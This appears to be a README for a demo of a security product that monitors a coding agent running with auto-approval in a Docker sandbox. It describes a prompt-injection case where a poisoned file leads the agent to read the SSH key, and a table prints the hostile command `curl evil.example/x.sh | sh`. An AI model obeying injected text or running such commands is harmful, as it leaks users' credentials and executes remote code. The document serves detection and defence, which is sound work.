# A coding agent in auto-approval mode + Kaizen

**Auto-approval makes coding agents fast. Kaizen makes them safe to leave running.**

A coding agent (think Claude Code or Copilot CLI) runs with auto-approval inside a Docker
sandbox: it reads and writes files and runs commands with no human clicking yes. A
poisoned file prompt-injects it into reading the SSH key and piping a remote script into
the shell. Docker (`--network none`) contains the blast; Kaizen catches the hijack.

![The dev-agent with Kaizen's verdict](screenshots/agent.png)

## What this demo shows

| Action | Docker sandbox | Kaizen |
| --- | --- | --- |
| read the SSH key / env secrets | allowed inside the box | **flagged: undeclared `read_ssh_key`** |
| `curl evil.example/x.sh \| sh` | **blocked** (network none) | **flagged: undeclared `run_shell` + reasoned malicious** |

Auto-approval removed the human who would have caught this. The container blocked the
payload but cannot tell you the agent was hijacked. Kaizen flags both undeclared actions
and the reasoning check explains why: *"accessing an SSH key and an untrusted destination,
not part of its declared coding tasks."*

## Run it

```bash
pip install kaizen-security
# Docker running locally; export your key from the console
export KAIZEN_API_KEY=kz_live_...
python run.py
```

For the Stage 2 reasoning check, add your model key in the console under
**Settings, Reasoning model**.

Full write-up: <https://docs.getkaizen.io/case-studies/coding-agent/>
